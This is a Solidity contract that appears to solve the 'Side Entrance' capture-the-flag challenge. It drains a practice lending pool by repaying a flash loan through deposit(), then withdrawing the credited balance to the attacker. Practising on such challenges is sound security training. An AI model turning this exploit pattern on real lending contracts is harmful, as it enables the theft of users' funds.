// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceChallenge {
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw(); // withdrawing the balance as stored in balances mapping of pool
        payable(msg.sender).transfer(address(this).balance); // sending ether to attacker
    }

    // depositing loan back into the pool, increasing this contract's balance in the pool
    function execute() external payable {
        pool.deposit{ value: msg.value }();
    }

    receive() external payable {}
}